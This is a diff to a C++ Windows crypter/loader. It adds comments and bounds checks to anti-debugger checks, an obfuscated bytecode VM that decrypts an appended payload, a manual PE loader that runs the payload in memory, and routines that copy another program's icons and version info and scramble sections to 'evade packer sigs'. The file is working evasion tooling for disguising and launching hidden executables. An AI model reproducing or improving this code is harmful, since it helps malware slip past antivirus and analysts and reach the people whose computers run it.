@@ -13,6 +13,7 @@
 using Bytes = std::vector<BYTE>;
 
 bool isDebugged() {
+    // go away windbg
     if (IsDebuggerPresent()) return true;
     BOOL remote = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
@@ -106,6 +107,7 @@ Bytes lzPack(const Bytes& in) {
         findMatch(pos, ml, md);
         if (ml >= MINMATCH) {
             insert(pos);
+            // lazy matching: try 1 byte ahead, pick the better match
             if (pos + 1 + MINMATCH <= in.size()) {
                 int ml2, md2;
                 findMatch(pos + 1, ml2, md2);
@@ -161,6 +163,7 @@ Bytes lzUnpack(const Bytes& in) {
                 int dist = in[p] | (in[p + 1] << 8);
                 int len = (int)in[p + 2] + 3;
                 p += 3;
+                if (dist <= 0 || (size_t)dist > out.size()) break;
                 size_t src = out.size() - dist;
                 for (int i = 0; i < len; i++) out.push_back(out[src + i]);
             } else { out.push_back(in[p++]); }
@@ -170,40 +173,42 @@ Bytes lzUnpack(const Bytes& in) {
 }
 
 void vmRun(BYTE* data, uint64_t dataSz, const BYTE* code, size_t codesz, const BYTE* dec) {
+    // r0=data, r1=sz, r2=i, r3/4=key, r5=const, r6-8=tmp
     uint64_t r[9] = {};
     r[0] = (uint64_t)(uintptr_t)data;
     r[1] = dataSz;
     size_t ip = 0;
     while (ip < codesz) {
         uint8_t op = dec[code[ip++]];
+        if (ip > codesz) break;
         switch (op) {
         case HLT_I: return;
         case NOP_I: break;
-        case LDI_I: { uint8_t reg = code[ip++]; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip+i] << (i*8); ip += 8; r[reg] = v; break; }
-        case MOV_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] = r[s]; break; }
-        case ADD_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] += r[s]; break; }
-        case SUB_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] -= r[s]; break; }
-        case MUL_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] *= r[s]; break; }
-        case XOR_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] ^= r[s]; break; }
-        case AND_I: { uint8_t d = code[ip++], s = code[ip++]; r[d] &= r[s]; break; }
-        case OR_I:  { uint8_t d = code[ip++], s = code[ip++]; r[d] |= r[s]; break; }
-        case SHL_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; r[reg] <<= n; break; }
-        case SHR_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; r[reg] >>= n; break; }
-        case ROL_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; if (n) r[reg] = (r[reg] << n) | (r[reg] >> (64 - n)); break; }
-        case ROR_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; if (n) r[reg] = (r[reg] >> n) | (r[reg] << (64 - n)); break; }
-        case NOT_I: { uint8_t reg = code[ip++]; r[reg] = ~r[reg]; break; }
-        case ADDI_I: { uint8_t reg = code[ip++]; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip+i] << (i*8); ip += 8; r[reg] += v; break; }
-        case XORI_I: { uint8_t reg = code[ip++]; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip+i] << (i*8); ip += 8; r[reg] ^= v; break; }
-        case ANDI_I: { uint8_t reg = code[ip++]; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip+i] << (i*8); ip += 8; r[reg] &= v; break; }
-        case MULI_I: { uint8_t reg = code[ip++]; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip+i] << (i*8); ip += 8; r[reg] *= v; break; }
-        case ROLI_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; if (n) r[reg] = (r[reg] << n) | (r[reg] >> (64 - n)); break; }
-        case RORI_I: { uint8_t reg = code[ip++], n = code[ip++] & 63; if (n) r[reg] = (r[reg] >> n) | (r[reg] << (64 - n)); break; }
-        case LDB_I: { uint8_t d = code[ip++], b = code[ip++], idx = code[ip++]; r[d] = ((BYTE*)(uintptr_t)r[b])[r[idx]]; break; }
-        case STB_I: { uint8_t b = code[ip++], idx = code[ip++], s = code[ip++]; ((BYTE*)(uintptr_t)r[b])[r[idx]] = (BYTE)r[s]; break; }
-        case CMP_I: { uint8_t d = code[ip++], a = code[ip++], b2 = code[ip++]; r[d] = r[a] < r[b2] ? 1 : 0; break; }
-        case JMP_I: { int32_t off = 0; memcpy(&off, &code[ip], 4); ip = (size_t)((int64_t)(ip + 4) + off); break; }
-        case JNZ_I: { uint8_t reg = code[ip++]; int32_t off = 0; memcpy(&off, &code[ip], 4); ip += 4; if (r[reg]) ip = (size_t)((int64_t)ip + off); break; }
-        case CALL_I: { int32_t off = 0; memcpy(&off, &code[ip], 4); r[7] = ip + 4; ip = (size_t)((int64_t)(ip + 4) + off); break; }
+        case LDI_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; ip += 8; if (ip > codesz) break; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip - 8 + i] << (i*8); r[reg] = v; break; }
+        case MOV_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] = r[s]; break; }
+        case ADD_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] += r[s]; break; }
+        case SUB_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] -= r[s]; break; }
+        case MUL_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] *= r[s]; break; }
+        case XOR_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] ^= r[s]; break; }
+        case AND_I: { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] &= r[s]; break; }
+        case OR_I:  { if (ip + 1 >= codesz) break; uint8_t d = code[ip++], s = code[ip++]; if (d >= 9 || s >= 9) return; r[d] |= r[s]; break; }
+        case SHL_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; r[reg] <<= n; break; }
+        case SHR_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; r[reg] >>= n; break; }
+        case ROL_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; if (n) r[reg] = (r[reg] << n) | (r[reg] >> (64 - n)); break; }
+        case ROR_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; if (n) r[reg] = (r[reg] >> n) | (r[reg] << (64 - n)); break; }
+        case NOT_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; r[reg] = ~r[reg]; break; }
+        case ADDI_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; ip += 8; if (ip > codesz) break; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip - 8 + i] << (i*8); r[reg] += v; break; }
+        case XORI_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; ip += 8; if (ip > codesz) break; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip - 8 + i] << (i*8); r[reg] ^= v; break; }
+        case ANDI_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; ip += 8; if (ip > codesz) break; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip - 8 + i] << (i*8); r[reg] &= v; break; }
+        case MULI_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; ip += 8; if (ip > codesz) break; uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)code[ip - 8 + i] << (i*8); r[reg] *= v; break; }
+        case ROLI_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; if (n) r[reg] = (r[reg] << n) | (r[reg] >> (64 - n)); break; }
+        case RORI_I: { if (ip + 1 >= codesz) break; uint8_t reg = code[ip++], n = code[ip++] & 63; if (reg >= 9) return; if (n) r[reg] = (r[reg] >> n) | (r[reg] << (64 - n)); break; }
+        case LDB_I: { if (ip + 2 >= codesz) break; uint8_t d = code[ip++], b = code[ip++], idx = code[ip++]; if (d >= 9 || b >= 9 || idx >= 9) return; r[d] = ((BYTE*)(uintptr_t)r[b])[r[idx]]; break; }
+        case STB_I: { if (ip + 2 >= codesz) break; uint8_t b = code[ip++], idx = code[ip++], s = code[ip++]; if (b >= 9 || idx >= 9 || s >= 9) return; ((BYTE*)(uintptr_t)r[b])[r[idx]] = (BYTE)r[s]; break; }
+        case CMP_I: { if (ip + 2 >= codesz) break; uint8_t d = code[ip++], a = code[ip++], b2 = code[ip++]; if (d >= 9 || a >= 9 || b2 >= 9) return; r[d] = r[a] < r[b2] ? 1 : 0; break; }
+        case JMP_I: { if (ip + 4 > codesz) break; int32_t off = 0; memcpy(&off, &code[ip], 4); ip = (size_t)((int64_t)(ip + 4) + off); break; }
+        case JNZ_I: { if (ip >= codesz) break; uint8_t reg = code[ip++]; if (reg >= 9) return; if (ip + 4 > codesz) break; int32_t off = 0; memcpy(&off, &code[ip], 4); ip += 4; if (r[reg]) ip = (size_t)((int64_t)ip + off); break; }
+        case CALL_I: { if (ip + 4 > codesz) break; int32_t off = 0; memcpy(&off, &code[ip], 4); r[7] = ip + 4; ip = (size_t)((int64_t)(ip + 4) + off); break; }
         case RET_I: { ip = (size_t)r[7]; break; }
         }
     }
@@ -220,10 +225,11 @@ Bytes makeVmProgram(const BYTE* enc, uint64_t key1, uint64_t key2) {
     eOp(bc,enc,LDI_I); eR(bc,2); e64(bc,0);
     eOp(bc,enc,LDI_I); eR(bc,3); e64(bc,key1);
     eOp(bc,enc,LDI_I); eR(bc,4); e64(bc,key2);
-    eOp(bc,enc,LDI_I); eR(bc,5); e64(bc,0x9E3779B97F4A7C15ull);
+    eOp(bc,enc,LDI_I); eR(bc,5); e64(bc,0x9E3779B97F4A7C15ull); // φ
 
-    eOp(bc,enc,LDI_I); eR(bc,6); e64(bc,0x1337);
-    eOp(bc,enc,LDI_I); eR(bc,7); e64(bc,0x1338);
+    // coffee before cream
+    eOp(bc,enc,LDI_I); eR(bc,6); e64(bc,0xCAFE);
+    eOp(bc,enc,LDI_I); eR(bc,7); e64(bc,0xCAFF);
     eOp(bc,enc,CMP_I); eR(bc,8); eR(bc,6); eR(bc,7);
     eOp(bc,enc,JNZ_I); eR(bc,8);
     int opqPatch = (int)bc.size(); e32(bc, 0); // Jumps over if true
@@ -241,6 +247,7 @@ Bytes makeVmProgram(const BYTE* enc, uint64_t key1, uint64_t key2) {
     int bodyPos = (int)bc.size();
     { int32_t off = bodyPos - (jnzPatch + 4); memcpy(&bc[jnzPatch], &off, 4); }
 
+    // keystream
     eOp(bc,enc,MOV_I); eR(bc,6); eR(bc,3);
     eOp(bc,enc,XOR_I); eR(bc,6); eR(bc,4);
     eOp(bc,enc,ADD_I); eR(bc,6); eR(bc,5);
@@ -251,6 +258,7 @@ Bytes makeVmProgram(const BYTE* enc, uint64_t key1, uint64_t key2) {
     eOp(bc,enc,NOT_I); eR(bc,8);
     eOp(bc,enc,STB_I); eR(bc,0); eR(bc,2); eR(bc,8);
 
+    // key mixing
     eOp(bc,enc,MOV_I); eR(bc,6); eR(bc,3);
     eOp(bc,enc,ROL_I); eR(bc,6); eR(bc,11);
     eOp(bc,enc,XOR_I); eR(bc,6); eR(bc,4);
@@ -277,6 +285,7 @@ Bytes makeVmProgram(const BYTE* enc, uint64_t key1, uint64_t key2) {
 }
 
 void vmEncryptPayload(Bytes& pay, uint64_t k1, uint64_t k2) {
+    // stream cipher: xor + NOT (cuz 1 layer is boring)
     uint64_t k3 = 0x9E3779B97F4A7C15ull;
     for (size_t i = 0; i < pay.size(); i++) {
         uint8_t b = pay[i];
@@ -292,6 +301,7 @@ void vmEncryptPayload(Bytes& pay, uint64_t k1, uint64_t k2) {
 }
 
 bool runInMem(const Bytes& data) {
+    // manual PE loader
     if (data.size() < sizeof(IMAGE_DOS_HEADER)) return false;
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data.data();
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
@@ -352,16 +362,18 @@ bool runInMem(const Bytes& data) {
 }
 
 bool tryRun() {
+    // self-extract: find tail, decrypt, run
     if (isDebugged()) return false;
     char self[MAX_PATH];
     GetModuleFileNameA(NULL, self, MAX_PATH);
     Bytes blob = loadFile(self);
     if (blob.size() < sizeof(Tail) + 4) return false;
+    // tail offset -> vmCode -> payload
     DWORD off = *(DWORD*)&blob[blob.size() - 4];
     if (off + sizeof(Tail) > blob.size()) return false;
     Tail* t = (Tail*)&blob[off];
     if (memcmp(t->sig, "TINYLD40", 8)) return false;
-    if (off + sizeof(Tail) + t->vmCodeSz + t->packSz + 4 != blob.size()) return false;
+    if ((uint64_t)off + sizeof(Tail) + (uint64_t)t->vmCodeSz + (uint64_t)t->packSz + 4 != blob.size()) return false;
 
     BYTE* vmCodePtr = (BYTE*)(t + 1);
     BYTE* payPtr = vmCodePtr + t->vmCodeSz;
@@ -390,6 +402,7 @@ BOOL CALLBACK resCbk(HMODULE mod, LPCSTR type, LPSTR name, LONG_PTR ctx) {
 }
 
 void cloneRes(const std::string& src, const std::string& dst) {
+    // clone icons, manifest, version
     HMODULE mod = LoadLibraryExA(src.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
     if (!mod) return;
     HANDLE h = BeginUpdateResourceA(dst.c_str(), FALSE);
@@ -405,6 +418,7 @@ void cloneRes(const std::string& src, const std::string& dst) {
 }
 
 void scrambleSections(Bytes& data) {
+    // evade packer sigs
     if (data.size() < sizeof(IMAGE_DOS_HEADER)) return;
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data.data();
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
